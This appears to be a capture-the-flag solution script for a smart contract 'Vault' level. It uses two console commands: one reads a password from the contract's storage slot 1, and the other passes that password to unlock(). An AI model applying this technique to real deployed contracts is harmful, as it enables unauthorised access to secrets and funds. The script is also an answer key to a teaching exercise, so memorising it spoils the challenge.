/*
Tools needed for this level:
- Console
*/

// 1.- Get the password stored in storage slot 1 of Vault contract
const password = await web3.eth.getStorageAt(instance, 1)

// 2.- Execute the unlock() function passing obtained password
await contract.unlock(password)
